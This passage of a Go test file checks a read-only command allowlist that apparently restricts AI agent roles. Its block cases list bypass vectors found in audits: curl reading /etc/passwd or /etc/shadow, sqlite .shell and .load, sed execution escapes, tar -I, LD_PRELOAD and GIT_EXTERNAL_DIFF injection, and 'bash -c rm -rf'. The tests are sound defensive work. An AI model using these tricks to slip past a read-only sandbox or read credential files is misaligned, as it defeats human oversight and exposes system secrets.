			// Assert the allowlist layer itself (legacy write-head fallback
			// also blocks make/gcc; the hole was in checkCompilerQuery).
			if got := screenReadonlyAllowlist(tc.argv); got == "" {
				t.Fatalf("screenReadonlyAllowlist(%v) must block bare/non-query", tc.argv)
			}
			if got := guardArgvReadonly(tc.argv); got == "" {
				t.Fatalf("guardArgvReadonly(%v) must block", tc.argv)
			}
		})
	}
	// Round-4: compilers/make removed entirely (even --version).
	for _, argv := range [][]string{
		{"make", "--version"}, {"make", "-v"}, {"make", "--help"}, {"make", "-h"},
		{"gmake", "--version"}, {"gcc", "--version"}, {"gcc", "-dumpversion"}, {"clang", "--help"},
	} {
		if got := screenReadonlyAllowlist(argv); got == "" {
			t.Fatalf("screenReadonlyAllowlist(%v) must block", argv)
		}
		if got := guardArgvReadonly(argv); got == "" {
			t.Fatalf("guardArgvReadonly(%v) must block", argv)
		}
	}
}

// Round-2 Must Fix: curl option values that begin with @ read local files.
func TestReadonlyAllowlist_CurlAtFileValues(t *testing.T) {
	t.Setenv(auditEnvRole, "reviewer")
	t.Setenv(auditEnvReadonly, "")

	block := []struct {
		name string
		argv []string
	}{
		{name: "-H @file", argv: []string{"curl", "-s", "-H", "@/etc/passwd", "https://x"}},
		{name: "-H@file", argv: []string{"curl", "-s", "-H@/etc/passwd", "https://x"}},
		{name: "--header @file", argv: []string{"curl", "-s", "--header", "@/etc/passwd", "https://x"}},
		{name: "--header=@file", argv: []string{"curl", "-s", "--header=@/etc/passwd", "https://x"}},
		{name: "-b @file", argv: []string{"curl", "-s", "-b", "@/etc/passwd", "https://x"}},
		{name: "--cookie=@file", argv: []string{"curl", "-s", "--cookie=@/tmp/c", "https://x"}},
		{name: "-u @file", argv: []string{"curl", "-s", "-u", "@/etc/passwd", "https://x"}},
		{name: "-A @file", argv: []string{"curl", "-s", "-A", "@/etc/passwd", "https://x"}},
		{name: "--user-agent=@file", argv: []string{"curl", "-s", "--user-agent=@/tmp/ua", "https://x"}},
		{name: "--referer @file", argv: []string{"curl", "-s", "--referer", "@/tmp/r", "https://x"}},
		{name: "-K config", argv: []string{"curl", "-K", "/tmp/curlrc", "https://x"}},
		{name: "--config", argv: []string{"curl", "--config", "/tmp/curlrc", "https://x"}},
	}
	for _, tc := range block {
		t.Run("block/"+tc.name, func(t *testing.T) {
			got := guardArgvReadonly(tc.argv)
			if got == "" {
				t.Fatalf("expected block for %v", tc.argv)
			}
			if !strings.Contains(got, "@") && !strings.Contains(got, "config") &&
				!strings.Contains(got, "-K") && !strings.Contains(got, "curl") {
				t.Fatalf("expected @file/config in detail, got %q", got)
			}
		})
	}
	// Round-4: curl removed entirely.
	if got := guardArgvReadonly([]string{"curl", "-s", "-H", "Accept: application/json", "https://x"}); got == "" {
		t.Fatalf("curl must block")
	}
	if got := guardArgvReadonly([]string{"curl", "-s", "--header=Accept: text/plain", "https://x"}); got == "" {
		t.Fatalf("curl must block")
	}
}

// Round-2 Must Fix: sqlite3 fail-closed on any dot-command; only SELECT/WITH/
// EXPLAIN/PRAGMA(no assign). Should Fix: --version/--help alone allowed.
func TestReadonlyAllowlist_SqliteDotFailClosed(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	allow := []struct {
		name string
		argv []string
	}{
		{name: "SELECT", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "SELECT 1"}},
		{name: "select lower", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "select 1"}},
		{name: "WITH", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "WITH c AS (SELECT 1) SELECT * FROM c"}},
		{name: "EXPLAIN", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "EXPLAIN SELECT 1"}},
		{name: "EXPLAIN QUERY PLAN", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "EXPLAIN QUERY PLAN SELECT 1"}},
		{name: "PRAGMA info", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "PRAGMA table_info(t)"}},
		{name: "--version alone", argv: []string{"sqlite3", "--version"}},
		{name: "-version alone", argv: []string{"sqlite3", "-version"}},
		{name: "--help alone", argv: []string{"sqlite3", "--help"}},
		{name: "-help alone", argv: []string{"sqlite3", "-help"}},
	}
	// Round-4: sqlite3 removed; former allows must block.
	for _, tc := range allow {
		t.Run("block-former-allow/"+tc.name, func(t *testing.T) {
			if got := guardArgvReadonly(tc.argv); got == "" {
				t.Fatalf("expected block for %v", tc.argv)
			}
		})
	}

	block := []struct {
		name string
		argv []string
		want string
	}{
		{name: ".read", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", ".read evil.sql"}, want: "sqlite"},
		{name: ".READ upper", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", ".READ evil.sql"}, want: "dot"},
		{name: ".load", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", ".load evil.so"}, want: "dot"},
		{name: ".LOAD", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", ".LOAD /tmp/x.so"}, want: "dot"},
		{name: ".shell", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", ".shell id"}, want: "dot"},
		{name: "multi stmt dot", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "SELECT 1; .shell id"}, want: "dot"},
		{name: "newline dot", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "SELECT 1\n.read x"}, want: "dot"},
		{name: "leading ws dot", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "  .read x"}, want: "dot"},
		{name: "INSERT", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "INSERT INTO t VALUES(1)"}, want: "sql"},
		{name: "DELETE", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "DELETE FROM t"}, want: "sql"},
		{name: "ATTACH", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "ATTACH 'x' AS o"}, want: "sql"},
		{name: "PRAGMA assign", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "PRAGMA soft_heap_limit=1000"}, want: "pragma"},
		{name: "version with db needs safe", argv: []string{"sqlite3", "--version", "/tmp/x.db"}, want: "safe"},
		{name: "help with db needs safe", argv: []string{"sqlite3", "-help", "/tmp/x.db"}, want: "safe"},
	}
	for _, tc := range block {
		t.Run("block/"+tc.name, func(t *testing.T) {
			got := guardArgvReadonly(tc.argv)
			if got == "" {
				t.Fatalf("expected block for %v", tc.argv)
			}
			low := strings.ToLower(got)
			if !strings.Contains(low, tc.want) && !strings.Contains(low, "sqlite") {
				t.Fatalf("expected %q in %q", tc.want, got)
			}
		})
	}
}

// Nice to Have: git config block hint points at --get / -l.
func TestReadonlyAllowlist_GitConfigHint(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	got := guardArgvReadonly([]string{"git", "config", "user.name"})
	if got == "" {
		t.Fatal("expected git config write block")
	}
	hinted := readonlyBlockWithHint(got)
	if !strings.Contains(hinted, "--get") && !strings.Contains(hinted, "-l") {
		t.Fatalf("expected --get/-l hint in %q", hinted)
	}
}

// === Merged from readonly_allowlist_alfix3_test.go ===

// Round-3: narrow the allowlist. Red tests for every agy Must/Should bypass
// sample; common reads must still pass.

func TestReadonlyAllowlist_Alfix3_SqliteSafeAndFuncs(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")
	// Round-4: sqlite3 removed entirely from the allowlist.
	for _, argv := range [][]string{
		{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "SELECT 1"},
		{"sqlite3", "-safe", "/tmp/x.db", "SELECT 1"},
		{"sqlite3", "--version"},
		{"sqlite3", "-safe", "/tmp/x.db", "SELECT writefile('/tmp/pwn','x')"},
	} {
		if got := guardArgvReadonly(argv); got == "" {
			t.Fatalf("sqlite3 must block: %v", argv)
		}
	}
	got := guardArgvReadonly([]string{"sqlite3", "-readonly", "/tmp/x.db", "SELECT 1"})
	hinted := readonlyBlockWithHint(got)
	if !strings.Contains(strings.ToLower(hinted), "jq") {
		t.Fatalf("hint should mention jq: %q", hinted)
	}
}

func TestReadonlyAllowlist_Alfix3_CurlNarrow(t *testing.T) {
	t.Setenv(auditEnvRole, "reviewer")
	t.Setenv(auditEnvReadonly, "")

	allow := []struct {
		name string
		argv []string
	}{
		{name: "-sSLf", argv: []string{"curl", "-sS", "-f", "-L", "https://example.com"}},
		{name: "-I", argv: []string{"curl", "-I", "https://example.com"}},
		{name: "-i", argv: []string{"curl", "-s", "-i", "https://example.com"}},
		{name: "-k", argv: []string{"curl", "-sk", "https://example.com"}},
		{name: "-m", argv: []string{"curl", "-s", "-m", "10", "https://example.com"}},
		{name: "--max-time", argv: []string{"curl", "-s", "--max-time", "10", "https://example.com"}},
		{name: "--connect-timeout", argv: []string{"curl", "-s", "--connect-timeout", "5", "https://example.com"}},
		{name: "-H", argv: []string{"curl", "-s", "-H", "Accept: application/json", "https://example.com"}},
		{name: "-X GET", argv: []string{"curl", "-s", "-X", "GET", "https://example.com"}},
		{name: "-X HEAD", argv: []string{"curl", "-s", "-X", "HEAD", "https://example.com"}},
	}
	// Round-4: curl removed; former allows must block.
	for _, tc := range allow {
		t.Run("block-former-allow/"+tc.name, func(t *testing.T) {
			if got := guardArgvReadonly(tc.argv); got == "" {
				t.Fatalf("expected block for %v", tc.argv)
			}
		})
	}

	block := []struct {
		name string
		argv []string
	}{
		{name: "-w output", argv: []string{"curl", "-s", "-w", "%{http_code}", "https://x"}},
		{name: "-w %output", argv: []string{"curl", "-s", "-w", "%output{/tmp/pwn}", "https://x"}},
		{name: "--write-out", argv: []string{"curl", "-s", "--write-out", "%output{/tmp/x}", "https://x"}},
		{name: "-b cookie file", argv: []string{"curl", "-s", "-b", "/tmp/cookies", "https://x"}},
		{name: "--cookie", argv: []string{"curl", "-s", "--cookie", "a=b", "https://x"}},
		{name: "-o file", argv: []string{"curl", "-s", "-o", "/tmp/out", "https://x"}},
		{name: "-o dash", argv: []string{"curl", "-s", "-o", "-", "https://x"}},
		{name: "-A ua", argv: []string{"curl", "-s", "-A", "ua", "https://x"}},
		{name: "-H @file", argv: []string{"curl", "-s", "-H", "@/etc/passwd", "https://x"}},
		{name: "-X POST", argv: []string{"curl", "-s", "-X", "POST", "https://x"}},
		{name: "-X OPTIONS", argv: []string{"curl", "-s", "-X", "OPTIONS", "https://x"}},
		{name: "-v verbose", argv: []string{"curl", "-v", "https://x"}},
	}
	for _, tc := range block {
		t.Run("block/"+tc.name, func(t *testing.T) {
			if got := guardArgvReadonly(tc.argv); got == "" {
				t.Fatalf("expected block for %v", tc.argv)
			}
		})
	}
}

func TestReadonlyAllowlist_Alfix3_ShortOptSwallow(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	// Previously: rg -n swallowed --pre=...; journalctl -e swallowed --rotate.
	block := []struct {
		name string
		argv []string
	}{
		{name: "rg -n --pre", argv: []string{"rg", "-n", "--pre", "evil", "foo"}},
		{name: "rg -n --pre=", argv: []string{"rg", "-n", "--pre=evil", "foo"}},
		{name: "rg -ni --pre", argv: []string{"rg", "-ni", "--pre=evil", "pat"}},
		{name: "grep -n --exclude-command-ish", argv: []string{"grep", "-n", "--pre", "x"}}, // unknown --pre
		{name: "journalctl -e --rotate", argv: []string{"journalctl", "-e", "--rotate"}},
		{name: "journalctl -e --vacuum-time", argv: []string{"journalctl", "-e", "--vacuum-time=1s"}},
	}
	for _, tc := range block {
		t.Run("block/"+tc.name, func(t *testing.T) {
			got := guardArgvReadonly(tc.argv)
			if got == "" {
				t.Fatalf("expected block for %v (shortBool/shortValue swallow)", tc.argv)
			}
		})
	}

	allow := []struct {
		name string
		argv []string
	}{
		{name: "rg -n pat", argv: []string{"rg", "-n", "foo", "."}},
		{name: "rg --files", argv: []string{"rg", "--files"}},
		{name: "rg -C", argv: []string{"rg", "-C", "2", "foo"}},
		{name: "rg -t", argv: []string{"rg", "-t", "go", "foo"}},
		{name: "jq -s", argv: []string{"jq", "-s", ".", "f.json"}},
		{name: "cut -c", argv: []string{"cut", "-c", "1-5", "f"}},
		{name: "head -c", argv: []string{"head", "-c", "10", "f"}},
		{name: "tail -c", argv: []string{"tail", "-c", "10", "f"}},
		{name: "journalctl -e", argv: []string{"journalctl", "-e", "-n", "20", "--no-pager"}},
	}
	for _, tc := range allow {
		t.Run("allow/"+tc.name, func(t *testing.T) {
			if got := guardArgvReadonly(tc.argv); got != "" {
				t.Fatalf("expected allow, got %q for %v", got, tc.argv)
			}
		})
	}
}

func TestReadonlyAllowlist_Alfix3_PositionalWrite(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	if got := guardArgvReadonly([]string{"uniq", "infile", "outfile"}); got == "" {
		t.Fatal("uniq infile outfile must block")
	}
	if got := guardArgvReadonly([]string{"uniq", "infile"}); got != "" {
		t.Fatalf("uniq infile must allow, got %q", got)
	}
	if got := guardArgvReadonly([]string{"python3", "-m", "json.tool", "in.json", "out.json"}); got == "" {
		t.Fatal("json.tool two positionals must block")
	}
	if got := guardArgvReadonly([]string{"python3", "-m", "json.tool", "in.json"}); got == "" {
		t.Fatal("json.tool one file must block (python removed)")
	}
	if got := guardArgvReadonly([]string{"python3", "-m", "json.tool"}); got == "" {
		t.Fatal("json.tool stdin must block (python removed)")
	}
	// tee/split not allowlisted
	if got := guardArgvReadonly([]string{"tee", "out"}); got == "" {
		t.Fatal("tee must block")
	}
	if got := guardArgvReadonly([]string{"split", "file"}); got == "" {
		t.Fatal("split must block")
	}
	if got := guardArgvReadonly([]string{"sort", "-o", "out", "in"}); got == "" {
		t.Fatal("sort -o must block")
	}
}

func TestReadonlyAllowlist_Alfix3_InterpretersRemoved(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	block := []struct {
		name string
		argv []string
	}{
		{name: "python -c", argv: []string{"python3", "-c", "print(1)"}},
		{name: "python --version", argv: []string{"python3", "--version"}},
		{name: "python -W -V script", argv: []string{"python3", "-W", "-V", "script.py"}},
		{name: "python script", argv: []string{"python3", "script.py"}},
		{name: "python -m pprint", argv: []string{"python3", "-m", "pprint"}},
		{name: "node -e", argv: []string{"node", "-e", "1"}},
		{name: "node --version", argv: []string{"node", "--version"}},
		{name: "perl -c", argv: []string{"perl", "-c", "x.pl"}},
		{name: "perl -e", argv: []string{"perl", "-e", "print 1"}},
		{name: "ruby -e", argv: []string{"ruby", "-e", "1"}},
		{name: "sh -V", argv: []string{"sh", "-V"}},
		{name: "bash bare", argv: []string{"bash"}},
		{name: "sh -s", argv: []string{"sh", "-s"}},
		{name: "bash script", argv: []string{"bash", "script.sh"}},
		{name: "dash -V", argv: []string{"dash", "-V"}},
	}
	for _, tc := range block {
		t.Run("block/"+tc.name, func(t *testing.T) {
			// Prefer allowlist-layer assertion where possible.
			if base := tc.argv[0]; base == "bash" || base == "sh" || base == "dash" {
				if got := screenReadonlyAllowlist(tc.argv); got == "" {
					t.Fatalf("allowlist must block %v", tc.argv)
				}
			}
			if got := guardArgvReadonly(tc.argv); got == "" {
				t.Fatalf("expected block for %v", tc.argv)
			}
		})
	}

	if got := guardArgvReadonly([]string{"bash", "-c", "ls /tmp"}); got == "" {
		t.Fatalf("bash -c must block")
	}
	if got := guardArgvReadonly([]string{"sh", "-c", "ls /tmp"}); got == "" {
		t.Fatalf("sh -c must block")
	}
	if got := guardArgvReadonly([]string{"python3", "-m", "json.tool"}); got == "" {
		t.Fatalf("json.tool must block")
	}
}

func TestReadonlyAllowlist_Alfix3_SystemctlGoNarrow(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	allow := []struct {
		name string
		argv []string
	}{
		{name: "status", argv: []string{"systemctl", "status", "ssh"}},
		{name: "is-active", argv: []string{"systemctl", "is-active", "ssh"}},
		{name: "is-enabled", argv: []string{"systemctl", "is-enabled", "ssh"}},
		{name: "list-units", argv: []string{"systemctl", "list-units"}},
		{name: "list-units typed", argv: []string{"systemctl", "--type", "service", "list-units"}},
		{name: "show", argv: []string{"systemctl", "show", "ssh"}},
		{name: "show property", argv: []string{"systemctl", "show", "--property", "Id", "ssh"}},
		{name: "go version", argv: []string{"go", "version"}},
		{name: "go env", argv: []string{"go", "env"}},
		{name: "go env GOPATH", argv: []string{"go", "env", "GOPATH", "GOROOT"}},
		{name: "go list", argv: []string{"go", "list", "./..."}},
	}
	for _, tc := range allow {
		t.Run("allow/"+tc.name, func(t *testing.T) {
			if got := guardArgvReadonly(tc.argv); got != "" {
				t.Fatalf("expected allow, got %q for %v", got, tc.argv)
			}
		})
	}

	block := []struct {
		name string
		argv []string
	}{
		{name: "systemctl start", argv: []string{"systemctl", "start", "ssh"}},
		{name: "systemctl cat", argv: []string{"systemctl", "cat", "ssh"}},
		{name: "systemctl property swallow", argv: []string{"systemctl", "--property", "status", "start", "ssh"}},
		{name: "go env -w", argv: []string{"go", "env", "-w", "GOPROXY=off"}},
		{name: "go env --w", argv: []string{"go", "env", "--w", "GOPROXY=off"}},
		{name: "go list -toolexec", argv: []string{"go", "list", "-toolexec", "evil", "./..."}},
		{name: "go list -exec", argv: []string{"go", "list", "-exec", "evil", "./..."}},
		{name: "go list -modfile", argv: []string{"go", "list", "-modfile", "/tmp/x", "./..."}},
		{name: "go list -overlay", argv: []string{"go", "list", "-overlay", "/tmp/x", "./..."}},
		{name: "go test", argv: []string{"go", "test", "./..."}},
		{name: "go vet", argv: []string{"go", "vet", "./..."}},
		{name: "go build", argv: []string{"go", "build", "."}},
		{name: "go run", argv: []string{"go", "run", "."}},
		{name: "go generate", argv: []string{"go", "generate", "./..."}},
		{name: "go doc", argv: []string{"go", "doc", "fmt"}},
		{name: "go mod tidy", argv: []string{"go", "mod", "tidy"}},
		{name: "go get", argv: []string{"go", "get", "./..."}},
		{name: "go install", argv: []string{"go", "install", "./..."}},
	}
	for _, tc := range block {
		t.Run("block/"+tc.name, func(t *testing.T) {
			if got := guardArgvReadonly(tc.argv); got == "" {
				t.Fatalf("expected block for %v", tc.argv)
			}
		})
	}
}

func TestReadonlyAllowlist_Alfix3_AllowlistSelfClose(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	// Assert allowlist layer itself (not only legacy blacklist).
	cases := []struct {
		name string
		argv []string
	}{
		{name: "bash bare", argv: []string{"bash"}},
		{name: "sh -s", argv: []string{"sh", "-s"}},
		{name: "tar bare", argv: []string{"tar"}},
		{name: "tar -h -xf", argv: []string{"tar", "-h", "-xf", "a.tar"}},
		{name: "git reflog expire", argv: []string{"git", "reflog", "expire", "--all"}},
		{name: "git reflog delete", argv: []string{"git", "reflog", "delete", "HEAD@{0}"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := screenReadonlyAllowlist(tc.argv); got == "" {
				t.Fatalf("screenReadonlyAllowlist(%v) must block", tc.argv)
			}
			if got := guardArgvReadonly(tc.argv); got == "" {
				t.Fatalf("guardArgvReadonly(%v) must block", tc.argv)
			}
		})
	}
	if got := screenReadonlyAllowlist([]string{"tar", "-tf", "a.tar"}); got == "" {
		t.Fatalf("tar -tf must block at allowlist")
	}
	if got := screenReadonlyAllowlist([]string{"git", "reflog"}); got != "" {
		t.Fatalf("git reflog bare must allow: %q", got)
	}
	if got := screenReadonlyAllowlist([]string{"git", "reflog", "show"}); got != "" {
		t.Fatalf("git reflog show must allow: %q", got)
	}
	if got := screenReadonlyAllowlist([]string{"git", "reflog", "-n", "5", "expire"}); got == "" {
		t.Fatalf("git reflog -n 5 expire must block")
	}
}

// === Merged from readonly_allowlist_alfix4_test.go ===

// Round-4: delete high-risk commands; tighten remaining parsers.
// Red samples cover AUDIT.md table (30) + prior agy samples.

func TestReadonlyAllowlist_Alfix4_AuditMustFixBlocked(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	cases := []struct {
		name string
		argv []string
		code string
	}{
		// 1 shell glued -c / extra args — whole shell deleted
		{name: "bash -ctrue", argv: []string{"bash", "-ctrue", "rm -rf /tmp/x"}},
		{name: "sh -ceu", argv: []string{"sh", "-ceu", "id"}},
		{name: "bash -c ls", argv: []string{"bash", "-c", "ls /tmp"}},
		{name: "sh -c ls", argv: []string{"sh", "-c", "ls /tmp"}},
		// 2 sed script escape — only sed -n Np|N,Mp kept
		{name: "sed e escape", argv: []string{"sed", "/[/s/]/e id;#/p"}},
		{name: "sed s", argv: []string{"sed", "s/a/b/", "f"}},
		{name: "sed d", argv: []string{"sed", "1d", "f"}},
		// 3-6 sqlite — whole command deleted
		{name: "sqlite comment escape", argv: []string{"sqlite3", "-readonly", "-safe", "a.db", `SELECT /*/ ' */ 1; VACUUM INTO "/tmp/pwn.db"; /* ' */`}},
		{name: "sqlite -safe create", argv: []string{"sqlite3", "-safe", "/tmp/new.db", "SELECT 1"}},
		{name: "sqlite PRAGMA paren", argv: []string{"sqlite3", "-safe", "a.db", "PRAGMA user_version(1)"}},
		{name: "sqlite WITH DELETE", argv: []string{"sqlite3", "-safe", "a.db", "WITH c AS (SELECT 1) DELETE FROM t"}},
		{name: "sqlite multi sqlParts", argv: []string{"sqlite3", "-readonly", "-safe", "a.db", "SELECT 1", ".output /tmp/x"}},
		{name: "sqlite ro+safe SELECT", argv: []string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "SELECT 1"}},
		// 7-8 tar deleted
		{name: "tar -I glued", argv: []string{"tar", "-I/usr/bin/id", "-tf", "a.tar", "gzip"}},
		{name: "tar tfI", argv: []string{"tar", "tfI", "a.tar", "/usr/bin/id"}},
		{name: "tar --index-file", argv: []string{"tar", "-tvf", "a.tar", "--index-file=/tmp/overwrite"}},
		{name: "tar -tf", argv: []string{"tar", "-tf", "a.tar"}},
		// 9 git grep -O
		{name: "git grep -O glued", argv: []string{"git", "grep", "-O/usr/bin/id", "root"}},
		{name: "git grep --open-files-in-pager=", argv: []string{"git", "grep", "--open-files-in-pager=/usr/bin/id", "root"}},
		{name: "git grep -O", argv: []string{"git", "grep", "-O", "/usr/bin/id", "root"}},
		// 10 git config --show-scope write
		{name: "git config --show-scope write", argv: []string{"git", "config", "--show-scope", "core.fsmonitor", "/usr/bin/id"}},
		// 11 git symbolic-ref
		{name: "git symbolic-ref set", argv: []string{"git", "symbolic-ref", "refs/heads/pwn", "refs/heads/main"}},
		{name: "git symbolic-ref -d", argv: []string{"git", "symbolic-ref", "-d", "refs/heads/pwn"}},
		// 12 git branch/tag modifiers as query
		{name: "git branch --no-column create", argv: []string{"git", "branch", "--no-column", "new_br"}},
		{name: "git tag --no-color create", argv: []string{"git", "tag", "--no-color", "new_tag"}},
		// 13 git worktree/reflog skip flags
		{name: "git worktree -q add", argv: []string{"git", "worktree", "-q", "add", "/tmp/wt"}},
		{name: "git reflog -n expire", argv: []string{"git", "reflog", "-n", "1", "expire", "--all"}},
		{name: "git reflog -n 5 expire", argv: []string{"git", "reflog", "-n", "5", "expire"}},
		// 14 git fsck
		{name: "git fsck --lost-found", argv: []string{"git", "fsck", "--lost-found"}},
		{name: "git-fsck --lost-found", argv: []string{"git-fsck", "--lost-found"}},
		// 15 uniq --group swallow
		{name: "uniq --group out", argv: []string{"uniq", "--group", "in.txt", "out.txt"}},
		// 16 VAR=val prefix
		{name: "GIT_EXTERNAL_DIFF assign", code: "GIT_EXTERNAL_DIFF=/usr/bin/id git diff"},
		{name: "TAR_OPTIONS assign", code: `TAR_OPTIONS="--to-command=/bin/sh" tar -xOf a.tar`},
		{name: "LD_PRELOAD assign", code: "LD_PRELOAD=/tmp/x.so ls"},
		// 17 path argv0 / cd
		{name: "./ls", argv: []string{"./ls"}},
		{name: "/tmp/rg", argv: []string{"/tmp/rg"}},
		{name: "cd", argv: []string{"cd", "/tmp"}},
		// 18 unzip deleted
		{name: "unzip -l after archive", argv: []string{"unzip", "archive.zip", "-l"}},
		{name: "unzip -vu", argv: []string{"unzip", "-vu", "archive.zip"}},
		{name: "unzip -l", argv: []string{"unzip", "-l", "archive.zip"}},
		// 19 optional_argument swallow
		{name: "journalctl --boot vacuum", argv: []string{"journalctl", "--boot", "--vacuum-size=1M"}},
		{name: "date --iso-8601 -s glued", argv: []string{"date", "--iso-8601", "-s2026-01-01"}},
		// Should Fix samples
		{name: "curl gopher", argv: []string{"curl", "gopher://127.0.0.1:6379/_FLUSHALL"}},
		{name: "curl file", argv: []string{"curl", "file:///etc/shadow"}},
		{name: "curl --header= swallow", argv: []string{"curl", "--header=", "-o", "/tmp/x", "https://example.com"}},
		{name: "curl -sS", argv: []string{"curl", "-sS", "https://example.com"}},
		{name: "strace -o", argv: []string{"strace", "-o", "/tmp/overwrite", "ls"}},
		{name: "busybox sh", argv: []string{"busybox", "sh", "-c", "id"}},
		{name: "timeout ls", argv: []string{"timeout", "5", "ls"}},
		{name: "python3 json.tool", argv: []string{"python3", "-m", "json.tool", "input.json"}},
		{name: "go list -compiled", argv: []string{"go", "list", "-compiled", "./..."}},
		{name: "go list -export", argv: []string{"go", "list", "-export", "./..."}},
		{name: "go list -test", argv: []string{"go", "list", "-test", "./..."}},
		{name: "file -s", argv: []string{"file", "-s", "/dev/sda"}},
		{name: "file -z", argv: []string{"file", "-z", "a.gz"}},
		{name: "file --magic-file", argv: []string{"file", "--magic-file", "/tmp/m", "f"}},
		{name: "rg --search-zip", argv: []string{"rg", "--search-zip", "pat"}},
		{name: "rg -z", argv: []string{"rg", "-z", "pat"}},
		{name: "rg --pre", argv: []string{"rg", "--pre", "cmd", "pat"}},
		{name: "date set digits", argv: []string{"date", "110306292026"}},
		{name: "allDigits /tmp/123", argv: []string{"/tmp/123"}},
		{name: "allDigits base", argv: []string{"123"}},
		{name: "read PATH", argv: []string{"read", "PATH"}},
		{name: "arith ((", argv: []string{"((", "PATH=0", "))"}},
		{name: "ctxmode --config", argv: []string{"ctxmode", "--config", "/tmp/evil.toml", "search"}},
		{name: "ctxmode -config", argv: []string{"ctxmode", "-config", "/tmp/evil.toml", "search"}},
		{name: "tail -f", argv: []string{"tail", "-f", "a.log"}},
		{name: "tail -F", argv: []string{"tail", "-F", "a.log"}},
		{name: "tail --follow", argv: []string{"tail", "--follow", "a.log"}},
		{name: "journalctl -f", argv: []string{"journalctl", "-f"}},
		{name: "journalctl --follow", argv: []string{"journalctl", "--follow"}},
		{name: "journalctl --rotate", argv: []string{"journalctl", "--rotate"}},
		{name: "journalctl --flush", argv: []string{"journalctl", "--flush"}},
		{name: "herdr wait-output", argv: []string{"herdr", "pane", "wait-output"}},
		{name: "git ls-remote", argv: []string{"git", "ls-remote"}},
		{name: "git remote show", argv: []string{"git", "remote", "show", "origin"}},
		{name: "gcc -E", argv: []string{"gcc", "-E", "x.c"}},
		{name: "make bare", argv: []string{"make"}},
		{name: "gzip -l", argv: []string{"gzip", "-l", "a.gz"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var got string
			if tc.code != "" {
				got = guardShellReadonly(tc.code)
			} else {
				got = guardArgvReadonly(tc.argv)
			}
			if got == "" {
				t.Fatalf("expected block for argv=%v code=%q", tc.argv, tc.code)
			}
		})
	}
}

func TestReadonlyAllowlist_AlFix4_CommonReadsStillPass(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	cases := []struct {
		name string
		argv []string
		code string
	}{
		{name: "cat", argv: []string{"cat", "/etc/hosts"}},
		{name: "head -n", argv: []string{"head", "-n", "20", "f"}},
		{name: "tail -n", argv: []string{"tail", "-n", "5", "f"}},
		{name: "wc", argv: []string{"wc", "-l", "f"}},
		{name: "rg", argv: []string{"rg", "-n", "foo", "."}},
		{name: "rg -A", argv: []string{"rg", "-A", "3", "foo", "."}},
		{name: "jq", argv: []string{"jq", ".", "f.json"}},
		{name: "git log", argv: []string{"git", "log", "-3"}},
		{name: "git show", argv: []string{"git", "show", "HEAD"}},
		{name: "git diff", argv: []string{"git", "diff"}},
		{name: "git status", argv: []string{"git", "status"}},
		{name: "git branch list", argv: []string{"git", "branch", "-a"}},
		{name: "ls", argv: []string{"ls", "-la"}},
		{name: "find", argv: []string{"find", ".", "-name", "*.go", "-print"}},
		{name: "sed -n range", argv: []string{"sed", "-n", "1,20p", "f"}},
		{name: "sed -n line", argv: []string{"sed", "-n", "5p", "f"}},
		{name: "ps", argv: []string{"ps", "aux"}},
		{name: "ss", argv: []string{"ss", "-lnt"}},
		{name: "git config --get", argv: []string{"git", "config", "--get", "user.name"}},
		{name: "git config -l", argv: []string{"git", "config", "-l"}},
		{name: "git worktree list", argv: []string{"git", "worktree", "list"}},
		{name: "git reflog", argv: []string{"git", "reflog"}},
		{name: "git reflog show", argv: []string{"git", "reflog", "show"}},
		{name: "git remote -v", argv: []string{"git", "remote", "-v"}},
		{name: "go list -json", argv: []string{"go", "list", "-json", "./..."}},
		{name: "go list -f", argv: []string{"go", "list", "-f", "{{.ImportPath}}", "./..."}},
		{name: "go list -m", argv: []string{"go", "list", "-m", "all"}},
		{name: "date -u", argv: []string{"date", "-u"}},
		{name: "date +fmt", argv: []string{"date", "+%Y-%m-%d"}},
		{name: "file plain", argv: []string{"file", "f"}},
		{name: "pipe", code: "ls /tmp | head -n 5"},
		{name: "hc send", argv: []string{"hc", "send", "t42", "done"}},
		{name: "uniq one file", argv: []string{"uniq", "f"}},
		{name: "journalctl -u -n", argv: []string{"journalctl", "-u", "x", "-n", "30", "--no-pager"}},
	}
	for _, tc := range cases {
